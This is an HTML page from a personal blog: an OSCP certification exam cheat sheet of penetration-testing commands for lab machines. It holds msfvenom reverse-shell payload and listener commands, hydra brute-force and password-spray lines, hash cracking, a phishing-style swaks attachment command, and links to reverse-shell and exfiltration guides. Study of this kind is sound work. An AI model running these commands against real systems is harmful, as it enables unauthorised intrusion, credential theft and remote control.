@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - Cheat Sheet - Core :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Pre-Exam Download the resources from the dedicated lab clients; Document your report as you go during the exam Do a practice exam! Setup Create directories: mkdir dc host1 host2
+Create sub directories: mkdir enu loot files exploits Setup hostnames: sudo nano /etc/hosts then add host/kali IPs Quick Reference sudo nmap -T5 -p- -v host1 -oN enu/host1.nmap sudo nmap -T5 -p80,443,1978-1980 -sCV -v host1 -oN enu/nmap-services.nmap gobuster dir -u http://host1 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap usr/share/wordlists/rockyou.txt usr/share/wordlists/SecLists nc -nvlp 4444 NetCat Cheat Sheet https://www.revshells.com/ Easy wins Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files. Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom Take breaks, and set timers: If you&rsquo;re not getting anywhere for more than half an hour, take a break. Get some fresh air, and you&rsquo;ll almost definitely think of a new idea. Similarly, celebrate when you make progress! If you finish a machine its a good time for a rest Regularly review the information you have for a machine - key services, known version numbers, and any known credentials. Document as you go - take screenshots of key moments in the machine, and of course when you read a proof file. Metasploit - pick the machine that you think you have the least chance of exploiting manually General Tips xfreerdp can pass the hash to login runas /user:domain\username cmd.exe (or rdp and open CMD as admin) Use the Kali directory: /usr/share/webshells for all your payloads. MSFVenom Shell code for Buffer Overflow https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/ If it&rsquo;s running SSH, find/replace the id_rsa !/bin/bash SMB - crackmapexec show available shares: crackmapexec smb 192.168.50.242 -u john -p &quot;dqsTwTpZPn#nL&quot; --shares Scanning UDP Ports for SNMP - https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727 " />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---cheat-sheet---core/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - Cheat Sheet - Core">
+<meta property="og:description" content="Pre-Exam Download the resources from the dedicated lab clients; Document your report as you go during the exam Do a practice exam! Setup Create directories: mkdir dc host1 host2
+Create sub directories: mkdir enu loot files exploits Setup hostnames: sudo nano /etc/hosts then add host/kali IPs Quick Reference sudo nmap -T5 -p- -v host1 -oN enu/host1.nmap sudo nmap -T5 -p80,443,1978-1980 -sCV -v host1 -oN enu/nmap-services.nmap gobuster dir -u http://host1 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap usr/share/wordlists/rockyou.txt usr/share/wordlists/SecLists nc -nvlp 4444 NetCat Cheat Sheet https://www.revshells.com/ Easy wins Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files. Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom Take breaks, and set timers: If you&rsquo;re not getting anywhere for more than half an hour, take a break. Get some fresh air, and you&rsquo;ll almost definitely think of a new idea. Similarly, celebrate when you make progress! If you finish a machine its a good time for a rest Regularly review the information you have for a machine - key services, known version numbers, and any known credentials. Document as you go - take screenshots of key moments in the machine, and of course when you read a proof file. Metasploit - pick the machine that you think you have the least chance of exploiting manually General Tips xfreerdp can pass the hash to login runas /user:domain\username cmd.exe (or rdp and open CMD as admin) Use the Kali directory: /usr/share/webshells for all your payloads. MSFVenom Shell code for Buffer Overflow https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/ If it&rsquo;s running SSH, find/replace the id_rsa !/bin/bash SMB - crackmapexec show available shares: crackmapexec smb 192.168.50.242 -u john -p &quot;dqsTwTpZPn#nL&quot; --shares Scanning UDP Ports for SNMP - https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727 " />
+<meta property="og:url" content="/posts/oscp---cheat-sheet---core/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---cheat-sheet---core/">OSCP - Cheat Sheet - Core</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+      #<a href="/tags/oscp/">oscp</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="pre-exam">Pre-Exam<a href="#pre-exam" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Download the resources from the dedicated lab clients;</li>
+<li>Document your report as you go during the exam</li>
+<li>Do a practice exam!</li>
+</ul>
+<h1 id="setup">Setup<a href="#setup" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Create directories: <code>mkdir dc host1 host2</code></p>
+<ul>
+<li>Create sub directories: <code>mkdir enu loot files exploits</code>
+Setup hostnames: <code>sudo nano /etc/hosts</code> then add host/kali IPs</li>
+</ul>
+<h1 id="quick-reference">Quick Reference<a href="#quick-reference" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li><code>sudo nmap -T5 -p- -v host1 -oN enu/host1.nmap</code></li>
+<li><code>sudo nmap -T5 -p80,443,1978-1980 -sCV -v host1 -oN enu/nmap-services.nmap</code></li>
+<li><code>gobuster dir -u http://host1 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap</code></li>
+<li><code>usr/share/wordlists/rockyou.txt</code></li>
+<li><code>usr/share/wordlists/SecLists</code></li>
+<li><code>nc -nvlp 4444</code> <a href="https://gist.github.com/cmbaughman/c91f41ba7b2cf71106f1">NetCat Cheat Sheet</a></li>
+<li><a href="https://www.revshells.com/">https://www.revshells.com/</a></li>
+</ul>
+<h1 id="easy-wins">Easy wins<a href="#easy-wins" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files.</li>
+<li>Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom</li>
+<li>Take breaks, and set timers: If you&rsquo;re not getting anywhere for more than half an hour, take a break. Get some fresh air, and you&rsquo;ll almost definitely think of a new idea.
+<ul>
+<li>Similarly, celebrate when you make progress! If you finish a machine its a good time for a rest</li>
+</ul>
+</li>
+<li>Regularly review the information you have for a machine - key services, known version numbers, and any known credentials.</li>
+<li>Document as you go - take screenshots of key moments in the machine, and of course when you read a proof file.</li>
+<li>Metasploit - pick the machine that you think you have the least chance of exploiting manually</li>
+</ul>
+<h1 id="general-tips">General Tips<a href="#general-tips" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>xfreerdp can pass the hash to login</li>
+<li><code>runas /user:domain\username cmd.exe</code> (or rdp and open CMD as admin)</li>
+<li>Use the Kali directory: <strong>/usr/share/webshells</strong> for all your payloads.</li>
+<li>MSFVenom Shell code for Buffer Overflow <a href="https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/">https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/</a></li>
+<li>If it&rsquo;s running SSH, find/replace the id_rsa</li>
+<li><code>!/bin/bash</code></li>
+<li>SMB - <code>crackmapexec</code> show available shares: <code>crackmapexec smb 192.168.50.242 -u john -p &quot;dqsTwTpZPn#nL&quot; --shares</code></li>
+<li>Scanning UDP Ports for SNMP - <a href="https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727">https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727</a></li>
+</ul>
+<p><img src="https://johnjhacking.com/uploads/autonmap.png" alt=""></p>
+<ul>
+<li>If you use metasploit, IMMEDIATELY run windows or linux exploit suggestor. It’s basically an autopwn.</li>
+</ul>
+<h1 id="exploits">Exploits<a href="#exploits" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Searchspolit
+<ul>
+<li>Search exploits <code>searchsploit remote mouse 3.008</code></li>
+<li>View exploit <code>searchsploit -x 46697</code></li>
+<li>Copy exploit <code>searchsploit -m 46697</code></li>
+</ul>
+</li>
+<li><a href="https://github.com/justakazh/sicat">Sicat</a> (<code>~/Tools/sicat</code>)
+<ul>
+<li>Search exploits: <code>python3 ~/Tools/sicat/sicat.py -k &quot;Keywords here&quot; --exploitdb --msfmodule --packetstorm --exploitalert --nvd</code></li>
+<li>Use exported nmap xml (use <code>-oX nmap_out.xml</code>): <code>python3 ~/Tools/sicat/sicat.py -nm nmap_out.xml --exploitdb --msfmodule --packetstorm --exploitalert --nvd</code></li>
+</ul>
+</li>
+<li>Nmap
+<ul>
+<li>Grep Exploit list <code>grep Exploits /usr/share/nmap/scripts/*.nse</code></li>
+<li>NSE help <code>nmap --script-help=nsescript-name.nse</code></li>
+</ul>
+</li>
+<li>MSFvenom - <a href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/">Cheatsheet</a>
+<ul>
+<li>PHP <code>msfvenom -p php/reverse_php LHOST=192.168.x.x LPORT=4444 -o shell.php</code></li>
+<li>Windows
+<ul>
+<li>List x64 payloads: <code>msfvenom -l payloads --platform windows --arch x64</code></li>
+<li>Unstaged Revshell: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.xx.xxx LPORT=4444 -f exe &gt; reverse.exe</li>
+<li>Metasploit staged: <code>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe</code>
+<ul>
+<li>Open msfconsole on Kali: <code>sudo msfconsole -q</code></li>
+<li>Multi-handler: <code>use multi/handler</code></li>
+<li>Set payload: <code>set payload windows/x64/shell/reverse_tcp</code></li>
+<li>Set options: <code>show options</code></li>
+<li>Run: <code>run</code> to listen, then run binary on target (<code>.\staged.exe</code>)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/">Alphanumeric Shellcode</a> <code>msfvenom -a x86 --platform windows -p windows/shell/shell_reverse_tcp -e x86/alpha_mixed -f python</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="grep">Grep<a href="#grep" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li><code>grep &quot;text string&quot; filetosearch.txt -A 5</code></li>
+<li><code>grep -rni &quot;text string&quot; /path/to/directory</code></li>
+</ul>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><a href="https://www.stationx.net/nmap-scripts/">Top 10 Scripts</a></p>
+<ul>
+<li><code>sudo nmap -p- -T5 -o target.nmap 192.168. -v</code></li>
+<li><code>sudo nmap -Pn -p22,25,80 -sCV 192.168. -oN target.nmap -v</code></li>
+<li><code>sudo nmap -Pn -p21,242,3145,3389 -sCV 192.168.171.46 -oN authby-tcp.nmap -v --script=vulners --script-args mincvss=9.8</code></li>
+</ul>
+<h1 id="fuzzing">Fuzzing<a href="#fuzzing" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Gobuster</p>
+<ul>
+<li>Directory search: <code>gobuster dir -u http://target.ip.address.here:port -w //usr/share/dirb/wordlists/common.txt</code></li>
+<li>Find files: <code>gobuster dir -u http://www.targetwebsite.com/ -w /usr/share/dirb/wordlists/big.txt -x php,html,htm</code>
+<ul>
+<li>Other wordlists: <code>common.txt</code>
+FFUF</li>
+</ul>
+</li>
+<li>Directory search: <code>ffuf -u http://192.168.x.x:80/FUZZ -w /usr/share/wordlists/secLists/Discovery/Web-content/raft-medium-directories.txt -o ffuf_port</code></li>
+</ul>
+<h1 id="hydra">Hydra<a href="#hydra" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li><a href="https://github.com/frizb/Hydra-Cheatsheet">Cheatsheet</a></li>
+<li>FTP Default Creds: <code>hydra -C /usr/share/secLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.x.x</code></li>
+<li>HTTP Login: <code>hydra -L /usr/share/secLists/usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt 192.168.x.x http-get /</code></li>
+<li>SSH with known user: <code>sudo hydra -l username -P ~/Downloads/rockyou.txt -s PORT ssh://192.168.xx.xxx</code></li>
+<li>Password Spray RDP: <code>sudo hydra -L ~/Downloads/rockyou.txt -p &quot;sUp3rs3cur3p@ssw0rd rdp://192.168.xx.xxx</code></li>
+<li>HTTP POST Login Form:
+<ul>
+<li>Use burp to intercept a failed login attempt</li>
+<li>Copy line from POST request with username/password</li>
+<li>Run Hydra with failed login: <code>hydra -l user -P ~/Downloads/rockyou.txt 192.168.target.ip http-post-form &quot;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&quot;</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="cracking">Cracking<a href="#cracking" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>
+<p>John
+<code>john user.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules</code></p>
+</li>
+<li>
+<p>SSH2John: `wget <a href="https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py">https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py</a></p>
+<ul>
+<li><code>ssh2john id_rsa &gt; ssh.hash</code> (<code>nano</code> to remove usernames from start of <code>ssh.hash</code>)</li>
+<li><code>ssh -i root_rsa root@127.0.0.1 -o IdentitiesOnly=yes</code></li>
+</ul>
+</li>
+<li>
+<p>Hashcat - <a href="https://github.com/frizb/Hashcat-Cheatsheet">https://github.com/frizb/Hashcat-Cheatsheet</a></p>
+<ul>
+<li>(MD5): <code>hashcat -m 0 user.hash /usr/share/wordlists/rockyou.txt -r password.rule --force</code></li>
+<li>HashID: <code>hashcat --help | grep -i &quot;Hashname&quot;</code>
+<ul>
+<li><code>hash-identifier</code> or <code>hashid hashhere</code></li>
+</ul>
+</li>
+<li>Find mode: <code>hashcat --help | grep -i &quot;ntlm&quot;</code></li>
+<li>Password Rules: <code>ls -la /usr/share/hashcat/rules/</code><a href="https://github.com/Unic0rn28/hashcat-rules">Special Rules</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="email---swaks">Email - swaks<a href="#email---swaks" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Sending Emails with attachments to server req. authentication
+<code>sudo swaks -t target.user@target.com --from test@target.com -ap --attach @config.Library-ms --server target.mail.server.ip --body @emailbody.txt --header &quot;Subject: &quot; --suppress-data --auth-user test@target.com --auth-password knownpassword</code></p>
+<h2 id="web">Web<a href="#web" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Banner Grabbing: <code>curl -IL http://weboripaddress</code> &amp; Ctrl+U to view page source</li>
+<li><code>whatweb 192.168.xx.xxx</code></li>
+<li><a href="https://github.com/swisskyrepo/Wordpresscan">Wordpresscan</a></li>
+<li><code>wpscan --url http://192.168.xx.xxx --enumerate p --plugins-detection aggressive -o target/wpswcan</code></li>
+<li>Wordpress RCE <a href="https://medium.com/@althubianymalek/uploading-a-shell-in-wordpress-via-sqli-entry-point-1caf441b3d9a">https://medium.com/@althubianymalek/uploading-a-shell-in-wordpress-via-sqli-entry-point-1caf441b3d9a</a></li>
+</ul>
+<h1 id="other-cheat-sheets">Other Cheat Sheets<a href="#other-cheat-sheets" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources</a></p>
+</li>
+<li>
+<p><a href="https://github.com/RajChowdhury240/OSCP-CheatSheet/tree/main">https://github.com/RajChowdhury240/OSCP-CheatSheet/tree/main</a></p>
+</li>
+<li>
+<p><a href="https://infosecsanyam261.gitbook.io/tryharder">https://infosecsanyam261.gitbook.io/tryharder</a></p>
+</li>
+<li>
+<p><a href="https://strange-1.gitbook.io/notes">https://strange-1.gitbook.io/notes</a></p>
+</li>
+<li>
+<p><a href="https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</a></p>
+</li>
+<li>
+<p><a href="https://github.com/0xsyr0/OSCP">https://github.com/0xsyr0/OSCP</a></p>
+</li>
+<li>
+<p><a href="https://mqt.gitbook.io/oscp-notes">https://mqt.gitbook.io/oscp-notes</a></p>
+</li>
+<li>
+<p><a href="https://github.com/Twigonometry/Cybersecurity-Notes/tree/main/Exam%20Resources/OSCP">https://github.com/Twigonometry/Cybersecurity-Notes/tree/main/Exam%20Resources/OSCP</a></p>
+</li>
+<li>
+<p><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0">https://dmcxblue.gitbook.io/red-team-notes-2-0</a></p>
+</li>
+<li>
+<p><a href="https://3os.org/penetration-testing/cheatsheets/nmap-cheatsheet/">https://3os.org/penetration-testing/cheatsheets/nmap-cheatsheet/</a></p>
+</li>
+<li>
+<p><a href="https://github.com/A-poc/RedTeam-Tools">https://github.com/A-poc/RedTeam-Tools</a></p>
+</li>
+<li>
+<p><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></p>
+</li>
+<li>
+<p><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/">https://sushant747.gitbooks.io/total-oscp-guide/content/</a></p>
+</li>
+<li>
+<p><a href="https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP_Notes.md">https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP_Notes.md</a></p>
+</li>
+<li>
+<p><a href="https://infosecsanyam261.gitbook.io/tryharder">https://infosecsanyam261.gitbook.io/tryharder</a></p>
+</li>
+<li>
+<p><a href="https://happycamper84.medium.com/windows-reverse-shells-cheatsheet-5eeb09b28c8e">https://happycamper84.medium.com/windows-reverse-shells-cheatsheet-5eeb09b28c8e</a></p>
+</li>
+<li>
+<p>Data Exfil - <a href="https://medium.com/@0xUN7H1NK4BLE/data-exfiltration-tips-tricks-3bd5c58af859">https://medium.com/@0xUN7H1NK4BLE/data-exfiltration-tips-tricks-3bd5c58af859</a></p>
+</li>
+</ul>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp---boolean---linux/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Boolean - Linux</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---clue---linux/" class="button inline next">
+         [<span class="button__text">OSCP - Clue - Linux</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
